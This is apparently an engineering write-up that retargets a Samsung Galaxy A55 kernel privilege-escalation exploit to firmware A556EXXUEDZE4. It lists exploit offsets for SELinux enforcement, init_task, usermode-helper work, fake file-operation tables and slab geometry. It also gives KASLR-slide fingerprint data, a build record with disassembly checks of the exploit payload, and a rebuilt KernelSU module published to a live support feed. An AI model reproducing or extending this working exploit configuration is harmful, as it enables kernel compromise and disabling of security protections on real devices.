# a55x-A556EXXUEDZE4

Samsung Galaxy A55 5G (SM-A556E, Exynos S5E8845 / "erd8845"), firmware
`A556EXXUEDZE4` (AP
`AP_A556EXXUEDZE4_A556EXXUEDZE4_MQB109662540_REV00_user_low_ship_MULTI_CERT_meta_OS16`,
security patch 2026-05-05, composite build `BP4A.251205.006`, One UI 8.5).

This is the full retarget of the A55 physical-P0 profile from CZDE
(6.1.138) to the device-proven UEDZE4 build (6.1.157).

- Build fingerprint:
  `samsung/a55xnsxx/essi:16/BP4A.251205.006/A556EXXUEDZE4:user/release-keys`
- Kernel: `6.1.157-android14-11`, raw Image 38,697,472 B, sha256
  `0494f519c7b1abcae169d2ad598fa5c0b00c36c9d3560d7d9e15f29677593f91`,
  `text_offset == 0`, image_size 0x27a0000, flags 0xa.
- KASLR / virtual base: `KIMAGE_TEXT_BASE = 0xffffffc008000000`.
- Evidence tree: `/media/k3nt/Data/4aDEV/a55-firmware/uedze4/`
  (`offsets.md`, `disasm-evidence.txt`, `derive.py`, `derive.log`,
  `btf-dumps.txt`, `p0_fingerprint.h`, `symbols/vmlinux.*`,
  `ap-work/kernel.bin`, `bl-work/sboot.bin`).
- Raw Image provenance: `boot.img` (67,108,864 B from the AP tar) ->
  `parse_bootimg.py` -> `ap-work/kernel.bin`; sha256 matches PR #303's
  recorded raw Image exactly. sboot decompressed to 5,260,080 B, sha256
  `c7f7d8f6beb19ba63bfbb92ba103dd91079699ac77eb84d6d9ae76d67b52ecf1`
  (matches PR #303).

## What changed vs CZDE

Every derived symbol moved; nothing was carried blind. Full table with
deltas is in `uedze4/offsets.md` §1. Highlights:

| Macro | CZDE | UEDZE4 |
| --- | --- | --- |
| `CALL_USERMODEHELPER_EXEC_WORK_OFF` | 0x000d37a8 | 0x000d4360 |
| `SYSTEM_UNBOUND_WQ_OFF` | 0x021aae60 | 0x022cae60 |
| `NOOP_LLSEEK_OFF` | 0x0039c6c8 | 0x0039ec9c |
| `GENERIC_FILE_SPLICE_READ_OFF` | 0x003ea1fc | 0x003ec8a0 |
| `CONFIGFS_READ_ITER_OFF` | 0x00469d74 | 0x0046cce8 |
| `CONFIGFS_BIN_WRITE_ITER_OFF` | 0x0046a2a4 | 0x0046d218 |
| `ASHMEM_IOCTL_OFF` | 0x00cc8544 | 0x00d2d4f8 |
| `ASHMEM_COMPAT_IOCTL_OFF` | 0x00cc8e7c | 0x00d2de30 |
| `ASHMEM_MMAP_OFF` | 0x00cc8ed4 | 0x00d2de88 |
| `ASHMEM_OPEN_OFF` | 0x00cc90f4 | 0x00d2e0a8 |
| `ASHMEM_RELEASE_OFF` | 0x00cc917c | 0x00d2e130 |
| `ASHMEM_SHOW_FDINFO_OFF` | 0x00cc929c | 0x00d2e250 |
| `ASHMEM_FOPS_OFF` | 0x0131ffb8 | 0x013c9b50 |
| `ASHMEM_MISC_FOPS_OFF` | 0x02338630 | 0x02464430 |
| `KMALLOC_CACHES_OFF` | 0x016bf898 | 0x01792ed8 |
| `ANON_PIPE_BUF_OPS_OFF` | 0x01199790 | 0x0120c610 |
| `INIT_TASK_OFF` | 0x021bf700 | 0x022df700 |
| `ROOT_TASK_GROUP_OFF` | 0x023c4d40 | 0x024f4d40 |
| `SELINUX_ENFORCING_OFF` | 0x024991a8 | 0x025c92f8 |
| `__START_FTRACE_EVENTS_OFF` | 0x0216a9a0 | 0x0228a940 |
| `__EVENT_SCHED_BLOCKED_REASON_OFF` | 0x0216ac50 | 0x0228abf0 |
| `SLIDE_NFULNL_LOGGER_NAME_OFF` | 0x01608454 | 0x016ca0d5 |
| `SLIDE_NFULNL_LOGGER_OBJECT_OFF` | 0x021b29d8 | 0x022d29e0 |
| `SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF` | 0x022f2e38 | 0x0241e878 |
| `SLIDE_SYSCTL_BOOTID_OFF` | 0x0253f3d8 | 0x026b0518 |
| `SLIDE_TRACEFS_WORKER_CALLER_OFF` | 0x000db0c4 | 0x000dbc94 |
| `SLIDE_PSELECT_WORD_SHIFT` | 5 | **3** |

### BTF

Not byte-identical to CZDE: unique blob at 0x1876a88..0x1e2a8c4
(5,979,708 B; type_len 3,540,392; str_len 2,439,292), sha256
`c8cc2f12fa476005aba20e70aef823923d5a63a4bb861d49cf9de1d8112b3c0f`
(CZDE: 5,854,051 B, `8eecaed1…9a99`). Type IDs/strings were renumbered,
but every dumped struct is offset-identical, so **all struct-layout
macros and `SKB_DATA_DELTA = -0xe80` carry unchanged** (skb_shared_info
0x158; round_up 64 = 0x180; 0x1000-0x180 = 0xe80).

### Shift verdict (load-bearing)

`SLIDE_PSELECT_WORD_SHIFT = 3`, measured directly on the UEDZE4 ELF:

- pselect chain 0x10+0x30+0x20+0x90+0x1c0 = 0x2b0; `stack_fds` at
  sp+0x50 -> E-0x260.
- futex chain 0x60+0x70+0x60+0x1b0 = 0x2e0; `rt_waiter` at sp+0x98 ->
  E-0x248 (q at sp+0x8, BTF futex_q.rt_waiter +0x58, store at sp+0x60).
- `(0x260-0x248)/8 = 3`.

PR #303's 3 agrees. **CZDE's 5 is superseded**: its own frame table sums
to 0x2e0, not the printed 0x2d0, so the correct CZDE value is also 3
(the CZDE target is intentionally left untouched by this wave).

### BTF-driven reclaim constants added

- `MM_STRUCT_SZ 0x400` (BTF mm_struct 0x3c0, SLUB stride 0x400; order-3
  slab -> 32 objects), `MM_ORDER 3`.
- `KMALLOC_CGROUP_TYPE 1`, `KMALLOC_CACHE_TYPES 3` — UEDZE4 BTF enum
  `kmalloc_cache_type`: NORMAL=0, DMA=0, CGROUP=1, RECLAIM=2, NR=3.
  (CZDE had been using the common.h defaults 2/4.)

### P0 constants and fingerprint

Re-verified from the UEDZE4 BL: `"Starting kernel...\n"` @0x18278e,
unique adrp+add pair @0x30730/0x30734; handoff
`ldr w8,[x8,#0xcf8]` (var @0x482cf8), `mov w9,#-0x80000000`,
`add x8,x8,x9`, `blr x8`; writer 0xC200101C -> `str w8,[x9,#0xcf8]`.
Image text_offset = 0 -> `P0_PHYS_OFFSET = P0_KERNEL_PHYS_LOAD =
0x80000000`.

`p0_fingerprint.h` regenerated at probe 0x1f0000:

```
verified 32 rows and 256 source qwords at probe 0x1f0000
```

31 of 32 rows differ from CZDE (only slide 0x1e0000 identical); the table
is row-for-row identical to PR #303's.

## Diff judgment vs PR #303 (`a55x-A556EXXUEDZE4`)

Kernel-derived values — **all agree** (independently re-derived here from
the same raw Image): every `ASHMEM_*`, `CONFIGFS_*`, `COPY_SPLICE_READ`,
`NOOP_LLSEEK`, `INIT_TASK`, `ROOT_TASK_GROUP`, `SELINUX_ENFORCING`,
`KMALLOC_CACHES`, `ANON_PIPE_BUF_OPS`, `CALL_USERMODEHELPER_EXEC_WORK`,
`SYSTEM_UNBOUND_WQ`, `SLIDE_NFULNL_LOGGER_NAME/OBJECT`,
`SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR`, `SLIDE_SYSCTL_BOOTID`,
`SLIDE_TRACEFS_WORKER_CALLER_OFF` (0x000dbc94), event id 106,
`SLIDE_PSELECT_WORD_SHIFT` 3, `KIMAGE_TEXT_BASE`, P0 constants, probe
0x1f0000, and the full 32-row fingerprint table.

Material differences, all route/tuning — not derivation:

| Item | Ours | PR #303 | Judgment |
| --- | --- | --- | --- |
| `SKB_DATA_DELTA` | -0xe80 | -0x1000 | Theirs is tied to the slide8-fops8 production geometry (marker at 0xe80, mirror at 0x1e80). Ours is the BTF-derived value for the physical-P0-oracle route; task requires the BTF derivation. Trusted: ours for our route. |
| `FOPS_OFF` / UMH layout | 0x7000 / 0x7800 / 0x7a00 | 0x2000 (+mirror 0x1e80) / 0x6000 / 0x6200 | Ours carries the A54 field-validated fops/UMH fix (commit ddd5d51); keep. |
| `SLIDE_BANK_*` | 4 slots, task 0x1000 | 5 slots, task 0x3200 | Bank geometry is route-specific; ours is the physical-P0-oracle layout; keep. |
| `APP_REQUIRE_FRESH_P0_SESSION` + pselect sync/guard | not defined | 1 + full guard complex | Deferred as a pair: our slide_app.c binds the guard declarations/waits to the fresh-session gate; adopting standalone breaks the build. Route semantics unchanged this wave. |
| `MM_STRUCT_SZ`, `MM_ORDER` | 0x400, 3 | 0x400, 3 | Agree (adopted after BTF check). |
| `KMALLOC_CGROUP_TYPE`, `KMALLOC_CACHE_TYPES` | 1, 3 | 1, 3 | Agree (BTF enum). |
| Ksnitch tuning | appended 4096, threshold 15, confirmations 5 | appended 2048, collisions 5, confirmations 3 | Keep our field-validated e1s tuning. |
| `KERNELSNITCH_MTE_ENABLED` | default 0 | 1 | Their flag is only consumed in the fresh-session canonicalization path we do not compile; no effect on our route. |

## Build record

`make TARGET=a55x-A556EXXUEDZE4 ANDROID_NDK_HOME=…android-ndk-r28b release`
(NDK r28b `aarch64-linux-android35-clang`, `-DAPP_PAYLOAD=1 -fPIC -Oz`,
gc-sections + icf, truncated to the release size):

```text
pre-truncate size: 97008
margin: 104128 - 97008 = 7120 B
artifact size: 104128
SHA-256: 399039a3e0c53f840abbad989929b94f9edd56ac6275a0b17818a8355a25772a
```

Binary spot-verify (llvm-objdump/strings on the release .so):

- label `a55x-A556EXXUEDZE4-app-physical-p0-oracle` present.
- `slide downstream verification armed` rodata string present.
- `prepare_slide_pselect_fdsets`: loop `cmp x22, #0x108` @0x12d10,
  stride `add x22, x22, #0x18` @0x12d38 -> 11 compact waiter words.
- `slide_pselect_global_word` = `add w0,w0,#0x3` @0x12ab4;
  `slide_pselect_put_waiter_word` word index `add w4,w4,#0x3` @0x12b4c
  (shift 3).
- `mov w1,#0x7000` -> `put_fake_fops_table` @0x11bbc-0x11bc8.
- `mov w8,#0x7800` / `mov w10,#0x7a00` @0x184c0/0x184c8 (UMH work/data).
- `[ksdiag]` format + `/sys/devices/system/cpu/possible`; all `[pipefix]`
  strings present.

## Route notes

Kept from the CZDE wave: compact `rt_mutex_waiter` (BTF confirms 0x58),
`APP_ACCEPT_SCHED_TRIGGER`, `SLIDE_KSNITCH_*` tuning, pipe budget-cap
logic, arsenal release, fops/UMH layout 0x7000/0x7800/0x7a00.

## KernelSU pair (KO wave — rebuilt for 6.1.157)

The CZDE KO carried over only after gates; UEDZE4 changes the kernel
release (6.1.138 -> 6.1.157) and the export surface, so the module was
rebuilt in the DDK (`ghcr.io/ylarod/ddk-min:android14-6.1-20260313`,
digest `1dd6ac34…d5d3`) with the release rewritten to
`6.1.157-android14-11`, `CONFIG_KSU=m`, KDP/RKP/DEFEX/NO_PATCH_TEXT all
`y`, and `KCFLAGS=-DCONFIG_DEBUG_INFO_BTF_MODULES=1`.

Gates against `uedze4/symbols/vmlinux.elf` (all PASS):

```text
vermagic: 6.1.157-android14-11 SMP preempt mod_unload modversions aarch64 (byte-exact)
check_symbol: (no output) EXIT=0
__versions: size 0; .symtab/.strtab present
target symvers: wrote 15450 exact target CRCs
audit: missing 0, version entries 0, CRC mismatches 0, kallsyms-resolved 47
```

Artifacts (feed pair):

```text
kernelsu/android14-6.1_kernelsu-a55x-A556EXXUEDZE4-kdp.ko
  398336 B, sha256 824f2af93a5d520ace0dd13f4f0cf8c1cc7b985b81872fa7fc5b194c6cbb1698
kernelsu/ksud-a55x-A556EXXUEDZE4-kdp
  4767304 B, sha256 1a602a84baa4831ea203d69d23852c05461f60b21c351c6ebc4ef8771ba7a5f3
  (embeds the new KO: exact libflate stream at offset 74240, full match)
```

The support-feed retarget is live in `support/targets-v3.json` (entry
`a55x-A556EXXUEDZE4`, `kernelVersions: ["6.1.157"]`, exploit 104128 B,
ksud 4767304 B). Full build/gate record: `docs/SM-A556E-A556EXXUEDZE4.md`.
